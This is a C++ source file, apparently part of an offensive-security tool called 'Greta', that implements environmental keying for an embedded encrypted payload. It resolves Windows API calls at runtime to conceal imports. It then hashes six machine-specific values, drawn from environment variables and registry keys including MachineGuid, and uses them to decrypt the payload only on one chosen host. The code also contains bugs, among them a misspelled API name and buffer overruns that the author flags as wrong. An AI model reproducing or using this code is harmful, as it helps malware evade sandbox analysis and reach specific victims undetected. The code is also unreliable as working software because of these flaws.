#include "greta.h"
#include <windows.h>
#include <stdio.h>
#include <vector>
#include <string>

typedef DWORD(WINAPI* _FormatMessageA)(DWORD dwFlags, LPCVOID lpSource, DWORD dwMessageId, DWORD dwLanguageId, LPSTR lpBuffer, DWORD nSize, va_list* Arguments);
typedef LSTATUS(WINAPI* _RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
typedef LSTATUS(WINAPI* _RegQueryValueExA)(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
typedef LSTATUS(WINAPI* _RegCloseKey)(HKEY hKey);
typedef DWORD(WINAPI* _GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
typedef BOOL(WINAPI* _CryptAcquireContextA)(HCRYPTPROV* phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
typedef BOOL(WINAPI* _CryptCreateHash)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTKEY hKey, DWORD dwFlags, HCRYPTHASH* phHash);
typedef BOOL(WINAPI* _CryptHashData)(HCRYPTHASH hHash, const BYTE* pbData, DWORD dwDataLen, DWORD dwFlags);
typedef BOOL(WINAPI* _CryptDeriveKey)(HCRYPTPROV hProv, ALG_ID Algid, HCRYPTHASH hBaseData, DWORD dwFlags, HCRYPTKEY* phKey);
typedef BOOL(WINAPI* _CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen);
typedef BOOL(WINAPI* _CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
typedef BOOL(WINAPI* _CryptDestroyHash)(HCRYPTHASH hHash);
typedef BOOL(WINAPI* _CryptDestroyKey)(HCRYPTKEY hKey);

#define ADVAPI32 "advapi32"
#define KERNEL32 "kernel32"

FARPROC resolve_function_address(LPCSTR lpModuleName, LPCSTR lpProcName)
{
	HMODULE hModule = nullptr;
	FARPROC pFunction = nullptr;

	hModule = GetModuleHandleA(lpModuleName);

	if (hModule == nullptr)
	{
		return (FARPROC)nullptr;
	}
	pFunction = GetProcAddress(hModule, lpProcName);

	if (hModule == nullptr)
	{
		return (FARPROC)nullptr;
	}

	return pFunction;
}

void zzSleep(int s)
{
	typedef void(WINAPI* _Sleep)(DWORD dwMilliSeconds);

	_Sleep pSleep = reinterpret_cast<_Sleep>(resolve_function_address(KERNEL32, "Sleep"));
	pSleep(s);
	return;
}

char* win_error_msg()
{
	_FormatMessageA pFormatMessageA = reinterpret_cast<_FormatMessageA>(resolve_function_address(KERNEL32, "FormatMessageBoxA"));
	char error[MAX_PATH];
	pFormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error, 255, NULL);
	return error;
}

int fowler_noll_vo(std::string s)
{
	if (s.size() == 0)
	{
		return 0;
	}

	int hva = 38395996;
	int prime = 61037065;

	for (int i = 0; i < s.size(); i++)
	{
		hva = hva ^ (s.data()[i]);
		hva = hva * prime;
	}
	return hva;
}

BOOL compare_fnv(int a, int b)
{
	if (a == b)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

std::string get_registry_value(int hive, std::string subkey, std::string valuename)
{
	HKEY hKey = nullptr;
	LSTATUS lStatus = ERROR;
	DWORD lpType = REG_SZ;
	LPBYTE lpData[512];
	DWORD lpcbData = sizeof(lpData);

	HKEY hHive = NULL;

	switch (hive)
	{
	case HKLM:
		hHive = HKEY_LOCAL_MACHINE;
		break;
	case HKCU:
		hHive = HKEY_CURRENT_USER;
	default:
		break;
	}

	if (hHive == 0)
	{
		return{};
	}

	_RegOpenKeyExA pRegOpenKeyExA = reinterpret_cast<_RegOpenKeyExA>(resolve_function_address(ADVAPI32, "RegOpenKeyExA"));
	// Sleep: zzSleep(SLEEP);
	_RegQueryValueExA pRegQueryValueExA = reinterpret_cast<_RegQueryValueExA>(resolve_function_address(ADVAPI32, "RegQueryValueExA"));
	// Sleep: zzSleep(SLEEP);
	_RegCloseKey pRegCloseKey = reinterpret_cast<_RegCloseKey>(resolve_function_address(ADVAPI32, "RegCloseKey"));

	lStatus = pRegOpenKeyExA(hHive, subkey.c_str(), 0, KEY_READ, &hKey);

	if (lStatus != 0)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	lStatus = pRegQueryValueExA(hKey, valuename.c_str(), 0, &lpType, (LPBYTE)lpData, &lpcbData);

	if (lStatus != 0)
	{
		return{};
	}

	// Sleep: zzSleep(SLEEP);
	lStatus = pRegCloseKey(hKey);
	if (lStatus != 0)
	{
		return{};
	}

	std::string key((char*)lpData);
	// Debug: printf("  // Registry Key: %s!%s == %s\n\n", subkey.c_str(), valuename.c_str(), key.c_str());
	return key;
}

std::string get_environmental_variable(std::string envvar)
{
	_GetEnvironmentVariableA pGetEnvironmentVariableA = reinterpret_cast<_GetEnvironmentVariableA>(resolve_function_address(KERNEL32, "GetEnvironmentVariableA"));
	// Sleep: zzSleep(SLEEP);
	const DWORD buffSize = 1024;
	char key[buffSize];
	if (pGetEnvironmentVariableA(envvar.c_str(), key, buffSize))
	{
		// Debug: printf("  // Environmental Variable: %s == %s\n\n", envvar.c_str(), key);
		return std::string(key);
	}
	else
	{
		return{};
	}
}

std::vector<unsigned char> aes256cbc_decrypt(std::vector<unsigned char> enc, std::string key)
{
	_CryptAcquireContextA pCryptAcquireContextA = reinterpret_cast<_CryptAcquireContextA>(resolve_function_address(ADVAPI32, "CryptAcquireContextA"));
	// Sleep: zzSleep(SLEEP);

	_CryptCreateHash pCryptCreateHash = reinterpret_cast<_CryptCreateHash>(resolve_function_address(ADVAPI32, "CryptCreateHash"));
	// Sleep: zzSleep(SLEEP);

	_CryptHashData pCryptHashData = reinterpret_cast<_CryptHashData>(resolve_function_address(ADVAPI32, "CryptHashData"));
	// Sleep: zzSleep(SLEEP);

	_CryptDeriveKey pCryptDeriveKey = reinterpret_cast<_CryptDeriveKey>(resolve_function_address(ADVAPI32, "CryptDeriveKey"));
	// Sleep: zzSleep(SLEEP);

	_CryptDecrypt pCryptDecrypt = reinterpret_cast<_CryptDecrypt>(resolve_function_address(ADVAPI32, "CryptDecrypt"));
	// Sleep: zzSleep(SLEEP);

	_CryptReleaseContext pCryptReleaseContext = reinterpret_cast<_CryptReleaseContext>(resolve_function_address(ADVAPI32, "CryptReleaseContext"));
	// Sleep: zzSleep(SLEEP);

	_CryptDestroyHash pCryptDestroyHash = reinterpret_cast<_CryptDestroyHash>(resolve_function_address(ADVAPI32, "CryptDestroyHash"));
	// Sleep: zzSleep(SLEEP);

	_CryptDestroyKey pCryptDestroyKey = reinterpret_cast<_CryptDestroyKey>(resolve_function_address(ADVAPI32, "CryptDestroyKey"));
	// Sleep: zzSleep(SLEEP);

	DWORD pdwDataLen = enc.size();

	std::vector<unsigned char> decrypted;

	if (key.empty())
	{
		return decrypted;
	}

	HCRYPTPROV hProv = NULL;
	HCRYPTHASH hHash = NULL;
	HCRYPTKEY hKey = NULL;

	// This is 100% wrong :D

	char* keyBuffer = new char[key.size()];
	memcpy(keyBuffer, key.data(), key.size());
	keyBuffer[key.size()] = '\00';

	// This is 100% wrong :D
	char* encBuffer = new char[enc.size()];
	memcpy(encBuffer, enc.data(), enc.size());
	encBuffer[enc.size()] = '\00';

	if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) == FALSE)
	{
		return {};
	}
	// Sleep: zzSleep(SLEEP);

	if (pCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash) == FALSE)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	if (pCryptHashData(hHash, (BYTE*)keyBuffer, (DWORD)key.size(), 0) == FALSE)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	if (pCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey) == FALSE)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	if (pCryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)encBuffer, (DWORD*)&pdwDataLen) == FALSE)
	{
		return{};
	}
	// Sleep: zzSleep(SLEEP);

	pCryptReleaseContext(hProv, 0);
	pCryptDestroyHash(hHash);
	pCryptDestroyKey(hKey);

	std::vector <unsigned char> vec(encBuffer, encBuffer + enc.size());
	return vec;
}

void print_data(char* label, std::vector<unsigned char> data)
{
	// Debug: printf("> %s\n", label);
	// Debug: printf("  :: Data: ");
	// Debug: for (int i = 0; i < data.size(); i++)
	// Debug: {
	// Debug: 	printf("0x%X ", data.data()[i]);
	// Debug: }
	// Debug: printf("\n");
	// Debug: printf("  :: Size: %d\n", (int)data.size());
	return;
}

GRETA do_keying(PGRETA greta)
{
	GRETA newGreta{};
	newGreta.bStatus = FALSE;

	std::string subkey = greta->subkey;
	std::string valuename = greta->valuename;
	std::string envvar = greta->envvar;

	std::vector<unsigned char> enc = greta->payload;

	int keySz = greta->keySz;

	int type = greta->type;
	int hive = greta->hive;

	int fnv = greta->fnv;

	std::string key;

	if (enc.empty())
	{
		newGreta.errormsg = "Encrypted length is 0\n";
		newGreta.bStatus = FALSE;
		return newGreta;
	}

	switch (type)
	{
	case REGISTRY:
		key = get_registry_value(hive, subkey, valuename);
		break;
	case VARIABLE:
		key = get_environmental_variable(envvar);
		break;
	default:
		break;
	}
	// Sleep: zzSleep(SLEEP);

	if (key.empty())
	{
		newGreta.errormsg = "Key length is NULL\n";
		newGreta.bStatus = FALSE;
		return newGreta;
	}

	//print_data((char*)"Key", key);
	//printf("\n");

	BOOL bCompare = compare_fnv((int)fnv, fowler_noll_vo(key));
	// Sleep: zzSleep(SLEEP);

	printf(" Keying..."); // Result
	if (bCompare == TRUE)
	{
		printf("\x1B[32m\t\tOK\033[0m\n"); // Result
		// Debug: printf("> Hash values match!\n\n");
	}
	else
	{
		printf("\x1B[31m\t\tFAILED\033[0m\n"); // Result
		newGreta.errormsg = "Environmental data FNV mismatch\n";
		newGreta.bStatus = FALSE;
		return newGreta;
	}

	// Debug: print_data((char*)"Encrypted", enc);
	// Debug: printf("  :: Encrypted data:\n%s\n", enc.data());
	// Debug: printf("\n");

	std::vector<unsigned char> decrypted = aes256cbc_decrypt(enc, key);

	if (decrypted.empty())
	{
		char buffer[1024];
		sprintf_s(buffer, sizeof buffer, "AES256CBC decryption failed, Windows Error: %s\n", win_error_msg());
		newGreta.errormsg = buffer;
		newGreta.bStatus = FALSE;
		return newGreta;
	}
	// Sleep: zzSleep(SLEEP);

	// Debug: print_data((char*)"Decrypted", enc);

	// Debug: printf("  :: Decrypted data:\n%s\n", decrypted.data());
	// Debug: printf("\n");

	newGreta.bStatus = TRUE;
	newGreta.payload = decrypted;
	newGreta.errormsg = "Greta finished successfully";
	return newGreta;
}


GRETA Greta()
{
printf("  ~ Greta ~ \n");
int origSz = 273;std::vector<unsigned char> startingEnc = { 0x41, 0x34, 0xe9, 0xbf, 0x9, 0xb2, 0x53, 0xac, 0x67, 0x6f, 0x98, 0x10, 0xf, 0x53, 0x82, 0x21, 0xbf, 0xe4, 0x81, 0x1e, 0x35, 0xaa, 0x1b, 0xe7, 0x92, 0x82, 0xed, 0x7a, 0xd4, 0xe9, 0x6, 0x47, 0xa2, 0x30, 0x59, 0xaa, 0xcc, 0x32, 0x6b, 0xa9, 0x5b, 0xe1, 0x8, 0x93, 0xb1, 0x2a, 0x60, 0xa5, 0x40, 0x1b, 0xd7, 0xa5, 0xbc, 0xe5, 0x5d, 0x25, 0xa8, 0x90, 0x3a, 0xce, 0xc4, 0xd2, 0x51, 0x66, 0xad, 0x56, 0xdf, 0x65, 0x69, 0x73, 0xa0, 0xee, 0xbd, 0xed, 0xef, 0x9, 0xa0, 0xd5, 0x5b, 0xa2, 0x2e, 0x1e, 0x39, 0xf7, 0x73, 0x97, 0xc4, 0xe3, 0x34, 0xe, 0xf4, 0xc, 0x17, 0x7a, 0x89, 0xbb, 0xea, 0x6, 0xbd, 0xbb, 0x4d, 0xa1, 0x74, 0x74, 0xa5, 0x15, 0xc9, 0x1a, 0x1b, 0xfd, 0x92, 0xfc, 0x72, 0xae, 0xf5, 0x14, 0x3d, 0xc1, 0xb2, 0x7f, 0xda, 0xd4, 0x63, 0x45, 0x8b, 0xbf, 0xc, 0xbc, 0x2b, 0xe9, 0x5b, 0xf1, 0xf1, 0x8f, 0xd7, 0x4, 0x46, 0xe9, 0xac, 0x59, 0x16, 0xf1, 0x7c, 0xd3, 0x8, 0x6f, 0xf, 0x1, 0x76, 0x20, 0xe5, 0x3a, 0x4e, 0x38, 0xe1, 0x79, 0xd, 0xe, 0x8c, 0xa8, 0x39, 0x75, 0x2f, 0x3a, 0xed, 0x91, 0x7c, 0x54, 0x55, 0x7f, 0x25, 0x15, 0x2f, 0xeb, 0x2b, 0x7b, 0xa8, 0x26, 0xf7, 0xe1, 0xea, 0x1c, 0xfe, 0x78, 0x69, 0xbb, 0x38, 0xd7, 0xaf, 0xcd, 0xc0, 0x38, 0x3a, 0x97, 0x2f, 0xcc, 0x46, 0x95, 0xc8, 0x87, 0xeb, 0xda, 0x6b, 0x7a, 0x3f, 0x54, 0xdf, 0xfc, 0x1, 0xae, 0x72, 0x12, 0x45, 0xb0, 0x86, 0x16, 0x7b, 0xa4, 0xa, 0xee, 0xeb, 0x89, 0x9a, 0x82, 0x8, 0x8d, 0xd6, 0xb8, 0x33, 0x3d, 0x6d, 0x23, 0x6d, 0xfb, 0x16, 0x7a, 0x9b, 0xa7, 0xc7, 0x4c, 0xb6, 0xeb, 0xca, 0x18, 0x89, 0xf1, 0x33, 0x63, 0xb7, 0x3e, 0xbe, 0x82, 0xe5, 0x44, 0xc, 0x14, 0xc7, 0xf4, 0x83, 0xf9, 0xbc, 0x47, 0xf0, 0x69, 0xa3, 0xd7, 0xe1, 0xbe, 0x7f, 0xdb, 0x1f, 0xa5, 0xa3, 0x17, 0xf5, 0xf3, 0x87, 0x7d, 0xe8, 0xcf, 0x5e, 0x42, 0x62, 0x19, 0x1e, 0xe9, 0x46, 0xb4, 0x2d, 0x34, 0x32, 0x63, 0x38, 0x5f, 0xb, 0xfe, 0x2d, 0xdc, 0xfd, 0xec, 0xb7, 0xaf, 0xcb, 0xd8, 0x1a, 0x56, 0xe7, 0x4, 0x8c, 0xc7, 0x3c, 0x97, 0x58, 0x4f, 0xb8, 0xe5, 0xb0, 0xb0, 0xa, 0x30, 0xd1, 0xb2, 0x67, 0xbe, 0xd6, 0xdf, 0x34, 0xd8, 0x5, 0x78, 0x9d, 0x63, 0x61, 0x7a, 0x43, 0xf8, 0xf7, 0x8d, 0xc7, 0x7e, 0x3c, 0x56, 0x7f, 0x6, 0x60, 0x54, 0x20, 0x52, 0x56, 0x79, 0xb, 0x6, 0x4c, 0xfd, 0x7a, 0x90, 0xe0, 0x74, 0x83, 0x4, 0x66, 0x4b, 0x80, 0xe4, 0xb9, 0x5, 0x44, 0x76 };

//Debug: print_data((char*)"Starting Data", startingEnc);
	GRETA greta{};
	greta.bStatus = FALSE;
	greta.payload = startingEnc;
		
	printf("|> [1]");
	// Variable == C:\Users\tommy
	greta.envvar = "USERPROFILE";
	greta.subkey = "";
	greta.valuename = "";
	greta.hive = 0;
	greta.keySz = 14;
	greta.type = VARIABLE;
	greta.fnv = 1113873197;

	greta = do_keying(&greta);

	if (greta.bStatus == FALSE)
	{
		printf("[!] Greta Error: %s\n", greta.errormsg.c_str());
		return{};
	}
	else
	{
		greta.envvar = "";
	}
		
	printf("|> [2]");
	// Variable == Intel64 Family 6 Model 45 Stepping 7, GenuineIntel
	greta.envvar = "PROCESSOR_IDENTIFIER";
	greta.subkey = "";
	greta.valuename = "";
	greta.hive = 0;
	greta.keySz = 50;
	greta.type = VARIABLE;
	greta.fnv = 500557642;

	greta = do_keying(&greta);

	if (greta.bStatus == FALSE)
	{
		printf("[!] Greta Error: %s\n", greta.errormsg.c_str());
		return{};
	}
	else
	{
		greta.envvar = "";
	}
		
	printf("|> [3]");
	// Variable == SHELBY.LOCAL
	greta.envvar = "USERDNSDOMAIN";
	greta.subkey = "";
	greta.valuename = "";
	greta.hive = 0;
	greta.keySz = 12;
	greta.type = VARIABLE;
	greta.fnv = 1518650502;

	greta = do_keying(&greta);

	if (greta.bStatus == FALSE)
	{
		printf("[!] Greta Error: %s\n", greta.errormsg.c_str());
		return{};
	}
	else
	{
		greta.envvar = "";
	}
		
	printf("|> [4]");
	// Variable == 2d07
	greta.envvar = "PROCESSOR_REVISION";
	greta.subkey = "";
	greta.valuename = "";
	greta.hive = 0;
	greta.keySz = 4;
	greta.type = VARIABLE;
	greta.fnv = 729478053;

	greta = do_keying(&greta);

	if (greta.bStatus == FALSE)
	{
		printf("[!] Greta Error: %s\n", greta.errormsg.c_str());
		return{};
	}
	else
	{
		greta.envvar = "";
	}
		
	printf("|> [5]");
	// Registry == 4.8.03761
	greta.envvar = "";
	greta.subkey = "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full";
	greta.valuename = "Version";
	greta.hive = HKLM;
	greta.keySz = 9;
	greta.type = REGISTRY;
	greta.fnv = 1014878787;

	greta = do_keying(&greta);

	if (greta.bStatus == FALSE)
	{
		printf("[!] Greta Error: %s\n", greta.errormsg.c_str());
		return{};
	}
	else
	{
		greta.envvar = "";
	}
		
	printf("|> [6]");
	// Registry == fa20973d-6aee-40fa-90ce-b3169646c414
	greta.envvar = "";
	greta.subkey = "SOFTWARE\\MICROSOFT\\CRYPTOGRAPHY";
	greta.valuename = "MachineGuid";
	greta.hive = HKLM;
	greta.keySz = 36;
	greta.type = REGISTRY;
	greta.fnv = 2582230570;

	greta = do_keying(&greta);

	if (greta.bStatus == FALSE)
	{
		printf("[!] Greta Error: %s\n", greta.errormsg.c_str());
		return{};
	}
	else
	{
		greta.envvar = "";
	}
		printf("|> Done!\n");
return greta;
}